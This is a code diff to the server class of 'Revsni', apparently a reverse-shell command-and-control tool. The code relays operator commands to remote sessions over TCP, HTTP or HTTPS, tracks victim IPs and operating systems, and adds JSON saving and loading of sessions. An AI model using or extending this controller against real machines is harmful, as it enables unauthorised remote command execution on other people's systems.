@@ -2,6 +2,7 @@ package com.revsni.server;
 
 
 import java.io.BufferedReader;
+import java.io.File;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.security.NoSuchAlgorithmException;
@@ -18,9 +19,11 @@ import javax.crypto.spec.IvParameterSpec;
 
 import com.revsni.Revsni;
 import com.revsni.common.Configuration;
+import com.revsni.common.Sessionerino;
 import com.revsni.common.Configuration.Mode;
 import com.revsni.server.http.HTTPShell;
 import com.revsni.server.https.HTTPSShell;
+import com.revsni.server.tcp.Listener;
 import com.revsni.utils.CouplePair;
 import com.revsni.utils.ThreadMonitor;
 import com.revsni.utils.Triplet;
@@ -31,6 +34,11 @@ import org.passay.CharacterRule;
 import org.passay.EnglishCharacterData;
 import org.passay.CharacterData;
 import org.passay.PasswordGenerator;
+
+import com.fasterxml.jackson.annotation.PropertyAccessor;
+import com.fasterxml.jackson.annotation.JsonAutoDetect.Visibility;
+import com.fasterxml.jackson.databind.ObjectMapper;
+import com.fasterxml.jackson.databind.SerializationFeature;
 
 
 
@@ -45,7 +53,7 @@ public class Server implements Runnable{
     private volatile IvParameterSpec iv;
     //private Configuration configuration;
     private volatile boolean first = true;
-    public volatile String shellType;
+    private volatile boolean firstOp = true;
     private volatile Updater updater;
     private volatile HTTPShell httpShell;
     private volatile HTTPSShell httpsShell;
@@ -57,7 +65,7 @@ public class Server implements Runnable{
     public volatile int sessionNumberStart;
     public volatile ArrayList<Triplet<Mode, Integer, String>> modePortUUID = new ArrayList<>();
     public volatile ArrayList<CouplePair<String, String>> ipOs = new ArrayList<>();
-    public volatile Map<Integer, Handler> handlerinos = new ConcurrentHashMap<>();
+    public volatile ConcurrentHashMap<Integer, Interaction> sessionHandlers = new ConcurrentHashMap<>();
 
     //Helper Lists and Maps for Sessions
     public volatile ArrayList<String> ips = new ArrayList<>();
@@ -71,23 +79,28 @@ public class Server implements Runnable{
 
 
     Logger logger = LogManager.getLogger(getClass());
-    public static final Logger loggerS = LogManager.getLogger(Server.class);
+    private static final Logger loggerS = LogManager.getLogger(Server.class);
 
 
 
-    public Server(String ip, int port, String pass, String salt, ThreadMonitor monitor, int sessionNumber) throws NoSuchAlgorithmException, InvalidKeySpecException, IOException {
+    public Server(String ip, int port, String pass, String salt, ThreadMonitor monitor, int sessionNumber, boolean loaded) throws NoSuchAlgorithmException, InvalidKeySpecException, IOException {
         this.sessionNumber = sessionNumber;
         this.sessionNumberStart = sessionNumber;
         
         this.threadMonitor = monitor;
+
+        if(!loaded) {
+            initServer(ip, port, pass, salt);
+        } else {
+            first = false;
+        }
         
-        initServer(ip, port, pass, salt);
 
 
     }
 
     public boolean initServer(String ip, int port, String password, String saltForPass) {
-        shellType = "TCP";
+        //setMode(sessionNumber, Mode.TCP);
         this.port = port;
         //this.ip = ip;
         //this.pass = password;
@@ -128,14 +141,13 @@ public class Server implements Runnable{
             listener = new Listener(this, sessionNumber);
             Thread listenerThread = new Thread(listener);
             listenerThread.start();
-            System.out.println("Listener started!");
         }
         while(isRunning()) {
             try {
                 String message;
                 do {
-                    if(first) { logger.info("Enter 'help' if you dont know what to do.\n\nListening...\n");}
-                    first = false;
+                    if(firstOp) { System.out.println("Listener started!"); logger.info("Enter 'help' if you dont know what to do.\n\nListening...\n");}
+                    firstOp = false;
 
                     InputStreamReader inputStreamReader = new InputStreamReader(System.in);
                     BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
@@ -149,23 +161,29 @@ public class Server implements Runnable{
                         case("switch"): 
                             printSwitch();
                             System.out.println("---Enter anything else to leave this menu.---\n");
-                            System.out.print("Revsn [" + shellType + "]["+ getIp(sessionNumber) +"]["+sessionNumber+"]» ");
+                            printIn();
                             String tmp = bufferedReader.readLine();
                             switch(tmp) {
                                 case("http"): 
                                     System.out.print("Specify a Port on which HTTP-Server should listen on: ");
                                     int port = Integer.parseInt(bufferedReader.readLine());
-                                    httpShell = new HTTPShell(key, iv, port);
+                                    httpShell = new HTTPShell(key, iv, port, sessionNumber);
                                     updater.setShellType("HTTP", String.valueOf(httpShell.getPort()));
                                     updater.generateOutputString();
                                     updater.writeOut();
-                                    getHandler(sessionNumber).update("httpSw");
-                                    shellType = "HTTP";
+                                    getInteraction(sessionNumber).sendCommand("httpSw");
+                                    setInteraction(sessionNumber, httpShell);
+                                    setMode(sessionNumber, Mode.HTTP);
+                                    /*
                                     if(!httpShell.getConnInf()) {
                                         logger.info("Failed to switch shell to HTTP!");
+                                        
+                                        //TODO Update this Fallback
                                         updater.setShellType("TCP", String.valueOf(this.port));
-                                        shellType = "TCP";
+                                        
+                                        setMode(sessionNumber, Mode.TCP);
                                     }
+                                    */
                                     break;
 
                                 case("https"): 
@@ -173,11 +191,12 @@ public class Server implements Runnable{
                                     int portIn = Integer.parseInt(bufferedReader.readLine());
                                     httpsShell = new HTTPSShell(key, iv, portIn);
                                     httpsShell.fireUp(portIn);
-                                    updater.setShellType("HTTPS", String.valueOf(httpsShell.getPort()));
+                                    updater.setShellType("HTTPS", String.valueOf(getInteraction(sessionNumber).getPort()));
                                     updater.generateOutputString();
                                     updater.writeOut();
-                                    getHandler(sessionNumber).update("httpsSw");
-                                    shellType = "HTTPS";
+                                    getInteraction(sessionNumber).sendCommand("httpsSw");
+                                    setInteraction(sessionNumber, httpsShell);
+                                    setMode(sessionNumber, Mode.HTTPS);
                                     break;
                             
                                 default:
@@ -185,8 +204,8 @@ public class Server implements Runnable{
                             } 
                             break;
                         case("mode"): printMode(); break;
-                        case("kill"): getHandler(sessionNumber).update("kill"); break;
-                        case("exit"): getHandler(sessionNumber).update("exit"); Revsni.setActive(false); return;
+                        case("kill"): getInteraction(sessionNumber).sendCommand("kill"); getInteraction(sessionNumber).sendCommand("exit"); break;
+                        case("exit"): Revsni.setActive(false); return;
                         case("encryption"): printEncryption(); break;
                         case("bg"):
                             Revsni.setActiveHelper(true); 
@@ -197,7 +216,7 @@ public class Server implements Runnable{
 
                                 }
                             }
-                            System.out.print("Revsn [" + shellType + "]["+ getIp(sessionNumber) +"]["+sessionNumber+"]» ");
+                            printIn();
                             break;  
                             
                         case("sessions"):
@@ -205,19 +224,20 @@ public class Server implements Runnable{
 
                             System.out.print("Which session you want to interact with? (type 'none' to exit): ");
                             sessionNumber = Integer.parseInt(bufferedReader.readLine());
-                            System.out.print("Revsn [" + shellType + "]["+ getIp(sessionNumber) +"]["+sessionNumber+"]» ");
+                            printIn();
                             message = "whoami";
                             break;
                             
                         default: 
-                            if(shellType.equals("TCP")) {
-                                getHandler(sessionNumber).update(message);
+                            if(getMode(sessionNumber).toString().equals("TCP")) {
+                                getInteraction(sessionNumber).sendCommand(message);
                             }
-                            if(shellType.equals("HTTP")) {
+                            if(getMode(sessionNumber).toString().equals("HTTP")) {
+                                sessionHandlers.get(sessionNumber).sendCommand(message);
                                 httpShell.sendCommand(message);
                             }
-                            if(shellType.equals("HTTPS")) {
-                                httpsShell.sendCommand(message);
+                            if(getMode(sessionNumber).toString().equals("HTTPS")) {
+                                sessionHandlers.get(sessionNumber).sendCommand(message);
                             }
                             
                     }
@@ -301,7 +321,6 @@ public class Server implements Runnable{
 
     public void setConfig(Configuration config) {
         //this.configuration = config;
-        this.shellType = config.getMode().toString();
 
         //Implement applying config to TCP, HTTP, HTTPS and stuff.
     }
@@ -316,43 +335,64 @@ public class Server implements Runnable{
  
     }
 
-    public static void removeSession(int uuid) {
-       //sessions.remove(uuid);
-    }
-
-    public static void removeSession(String name) {
-       //Implement
-    }
-
-    public void addHandlerinoSess(String ip, int port, Handler handler, int sessionNumber ) {
-        handlerinos.put(sessionNumber, handler);
+    public void addSession(String ip, int port, Interaction handler, int sessionNumber ) {
+        sessionHandlers.put(sessionNumber, handler);
         sessIpSt.put(sessionNumber, ip);
         
         //handlerinos.put(sessionNumber, handler);
     }
 
-    public void removeHandlerino(int sessionNumber) {
-        handlerinos.remove(sessionNumber);
+    public void removeSession(int sessionNumber) {
+        sessionHandlers.remove(sessionNumber);
+        modePortUUID.remove(sessionNumber - sessionNumberStart);
+        ipOs.remove(sessionNumber - sessionNumberStart);
     }
 
-    public Handler getHandler(int sessionNumber) {
-        return handlerinos.get(sessionNumber);
+    public Interaction getInteraction(int sessionNumber) {
+        logger.info("Getting interaction for sessioNumber: " + sessionNumber);
+        logger.info("Type is: " + sessionHandlers.get(sessionNumber).getMode().toString());
+        return sessionHandlers.get(sessionNumber);
     }
 
     public String getIp(int sessioNumber) {
         return sessIp.get(sessioNumber);
     }
 
+    public Mode getMode(int sessionNumber) {
+        Mode ret = null;
+        int sess = sessionNumber - sessionNumberStart;
+        ret = modePortUUID.get(sess).getKey();
+
+        return ret;
+    }
+
+    public void setMode(int sessionNumber, Mode mode) {
+        int sess = sessionNumber - sessionNumberStart;
+        Triplet<Mode, Integer, String> trip = new Triplet<Configuration.Mode,Integer,String>(mode, modePortUUID.get(sess).getValue(), modePortUUID.get(sess).getAddition());
+        modePortUUID.set(sess, trip);
+    }
+
     public void addToPrint(int sessNr) {
         String tmpIp = getIp(sessNr);
-        int tmpPort = getHandler(sessNr).getPort();
-        Mode tmpMode = getHandler(sessNr).getMode();
+        int tmpPort = getInteraction(sessNr).getPort();
+        Mode tmpMode = getInteraction(sessNr).getMode();
         String tmpUUID = sessNumUUID.get(sessNr);
         String tmpOs = sessionNumOs.get(sessNr);
 
         ipOs.add(new CouplePair<String,String>(tmpIp, tmpOs));
         modePortUUID.add(new Triplet<Mode, Integer, String>(tmpMode, tmpPort, tmpUUID));
-        System.out.print("Revsn [" + shellType + "]["+ getIp(sessionNumber) +"]["+sessionNumber+"]» ");
+        printIn();
+    }
+
+    public void setInteraction(int sessioNumber, Interaction interaction) {
+        if(sessionHandlers.get(sessioNumber) == null) {
+            sessionHandlers.put(sessioNumber, interaction);
+        }
+        sessionHandlers.replace(sessioNumber, interaction);
+    }
+
+    public void printIn() {
+        System.out.print("Revsn [" + getMode(sessionNumber).toString() + "]["+ getIp(sessionNumber) +"]["+sessionNumber+"]» ");
     }
 
 
@@ -369,7 +409,79 @@ public class Server implements Runnable{
                 "|\n");
             i++;
         }
+    }
 
+    public void saveSessions(String filename) {
+        ObjectMapper mapperino = new ObjectMapper();
+        File sessionFile = new File(filename + ".json");
+        mapperino.setVisibility(PropertyAccessor.FIELD, Visibility.ANY);
+        mapperino.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, false);
+        Sessionerino sessionerino = new Sessionerino(sessionNumberStart, modePortUUID, ipOs, null);
+        try {
+            mapperino.writeValue(sessionFile, sessionerino);
+            System.out.println("Successfully saved sessions to: '"+filename+".json'!");
+        } catch(IOException e) {
+            e.printStackTrace();
+            logger.error("FAILED TO SAVE SESSIONS TO FILE!");
+        }
+    }
+    public void saveSessions() {
+        ObjectMapper mapperino = new ObjectMapper();
+        File sessionFile = new File("sessions.json");
+        mapperino.setVisibility(PropertyAccessor.FIELD, Visibility.ANY);
+        mapperino.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, false);
+        Sessionerino sessionerino = new Sessionerino(sessionNumberStart, modePortUUID, ipOs, null);
+        try {
+            mapperino.writeValue(sessionFile, sessionerino);
+            System.out.println("Successfully saved sessions to 'sessions.json'!");
+        } catch(IOException e) {
+            e.printStackTrace();
+            logger.error("FAILED TO SAVE SESSIONS TO FILE!");
+        }
+    }
+
+    public boolean loadSessions(String filename) {
+        ObjectMapper mapperino = new ObjectMapper();
+        mapperino.setVisibility(PropertyAccessor.FIELD, Visibility.ANY);
+        File sessionFile = new File(filename + ".json");
+        try {
+            Sessionerino sessionerino = mapperino.readValue(sessionFile, Sessionerino.class);
+            sessionNumberStart = sessionerino.getSessionNumberStart();
+            modePortUUID = sessionerino.getModePortUUID();
+            ipOs = sessionerino.getIpOs();
+            System.out.println("Successfully loaded sessions from: '"+filename+".json'!");
+            return true;
+        } catch(IOException e) {
+            e.printStackTrace();
+            logger.error("FAILED TO LOAD SESSIONS FROM FILE!");
+            return false;
+        }
+    }
+    public boolean loadSessions() {
+        ObjectMapper mapperino = new ObjectMapper();
+        mapperino.setVisibility(PropertyAccessor.FIELD, Visibility.ANY);
+        File sessionFile = new File("sessions.json");
+        try {
+            Sessionerino sessionerino = mapperino.readValue(sessionFile, Sessionerino.class);
+            sessionNumberStart = sessionerino.getSessionNumberStart();
+            modePortUUID = sessionerino.getModePortUUID();
+            ipOs = sessionerino.getIpOs();
+            System.out.println("Successfully loaded sessions from: 'sessions.json'!");
+            return true;
+        } catch(IOException e) {
+            e.printStackTrace();
+            logger.error("FAILED TO LOAD SESSIONS FROM FILE!");
+            return false;
+        }
+    }
+
+    public void updateLoadedSessionsForHandlers(String uuid, Interaction interaction) {
+        for(Triplet<Mode, Integer, String> tip : modePortUUID) {
+            if(tip.getAddition().equals(uuid)) {
+                int sessId = modePortUUID.indexOf(tip) + sessionNumberStart;
+                sessionHandlers.replace(sessId, interaction);
+            }
+        }
     }
 
 
